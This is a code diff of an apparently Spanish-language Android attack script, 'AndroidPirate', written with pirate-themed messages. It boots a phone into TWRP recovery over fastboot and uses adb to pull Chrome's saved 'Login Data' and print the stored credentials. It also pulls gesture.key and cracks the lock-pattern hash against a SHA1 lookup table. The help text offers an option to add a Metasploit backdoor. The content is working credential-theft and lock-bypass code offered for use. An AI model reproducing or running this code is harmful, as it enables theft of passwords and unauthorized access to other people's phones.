@@ -28,10 +28,43 @@ def grab_tresure_from_phone():
         os.remove("dump/Login Data")
     print ("[1] Arr!! Attacar ese movil!!")
     os.system("""adb reboot bootloader""")
-    os.system("""fastboot boot twrp-2.8.7.1-hammerhead.img""")
+    os.system("""fastboot boot TWRP/twrp-2.8.7.1-hammerhead.img""")
     time.sleep(20)
     print ("[2] Yarr!! Abran PASO!!!!")
+    
+def reboot_phone():
+    os.system('''adb reboot''')
 
+def grab_whatssap_from_phone():
+    #pillar chats whatsapp
+    print("ARGG Capitann!! Aun no tenemos esta habilidad")
+
+def grab_pattern_from_phone():
+    #pillar patron de bloqueo
+    os.system('''adb pull /data/system/gesture.key dump''')
+    f = open("dump/gesture.key", "rb")
+    hash = f.read().encode('hex')
+    f.close()
+    f = open("AndroidGestureSHA1.txt", "r")
+    table = f.readlines()
+    f.close()
+    print ("[4] Encontrado el Mapa Del Tesoro...")
+    dict = {}
+    hash = hash.strip().upper()
+    for entry in table:
+        tmp = entry.split(';')
+        dict[ tmp[2].strip() ] = tmp[0].strip()
+    print ("[5] Por las barbas de Neptuno! Un Mapa!!! AARRRRGGGG!!!")
+    print ("    [+] la x marca el sitio ARGGG!!: %s" % hash)
+    print ("    [+] Ojo al parche!....")
+    try:
+        result = dict[hash]
+        print ("    [+] EL TESOROOO!!!: %s" % result)
+    except:
+        print("Arrg... parece ser que no tiene el patron activado o no encontramos cual es su conbinacion ARRGGG!!")
+        pass
+	
+def grab_chrome_from_phone():
     #pillar contrasenas chrome
     os.system('''adb pull "/data/data/com.android.chrome/app_chrome/Default/Login Data" dump''')
     print ("[3] La vitacora Del CaPitan! AARRRGG!!")
@@ -44,38 +77,11 @@ def grab_tresure_from_phone():
             print str(row).encode('utf-8')
     con.close()
 
-    #pillar chats whatsapp
-    #os.system('''adb pull "/data/data/com.android.chrome/app_chrome/Default/Login Data" dump''')
 
-    #pillar patron de bloqueo
-    os.system('''adb pull /data/system/gesture.key dump''')
-    f = open("dump/gesture.key", "rb")
-    hash = f.read().encode('hex')
-    f.close()
-
-    f = open("AndroidGestureSHA1.txt", "r")
-    table = f.readlines()
-    f.close()
-
-    print ("[4] Encontrado el Mapa Del Tesoro...")
-    dict = {}
-    hash = hash.strip().upper()
-    for entry in table:
-        tmp = entry.split(';')
-        dict[ tmp[2].strip() ] = tmp[0].strip()
-    print ("[5] Por las barbas de Neptuno! Un Mapa!!! AARRRRGGGG!!!")
-    print ("    [+] la x marca el sitio ARGGG!!: %s" % hash)
-    print ("    [+] Ojo al parche!....")
-    result = dict[hash]
-    print ("    [+] EL TESOROOO!!!: %s" % result)
-    os.system('''adb reboot''')
-
-
-
+	
 def main():
-
     help = '''
-        ./AndroidPirate.py -f <TWRP_backup_para_tu_modelo_de_movil.iso>
+        ./AndroidPirate.py -a -c -p -w <TWRP_backup_para_tu_modelo_de_movil.iso>
 
         -a:     Abordar el movil
         -m:     Agregar backdoor metasploit ARRGG
@@ -84,11 +90,18 @@ def main():
         -c:     Sacar contrasenias Chrome
         Ejemplo:    ./AndoridPirate.py -a -m -p /TWRP/TWRPbackup_nexus.iso
 	'''
-    for index in range(len(sys.argv)):
-        if sys.argv[index] == '-a':
-            grab_tresure_from_phone()
-        else:
-            print(help)
+    if sys.argv[1] == '-a':
+        grab_tresure_from_phone()
+        for index in range(len(sys.argv)):
+            if sys.argv[index] == '-c':
+			    grab_chrome_from_phone()
+            if sys.argv[index] == '-p':
+                grab_pattern_from_phone()
+            if sys.argv[index] == '-w':
+                grab_whatssap_from_phone()
+        reboot_phone()
+    else:
+        print(help)
 
 
 
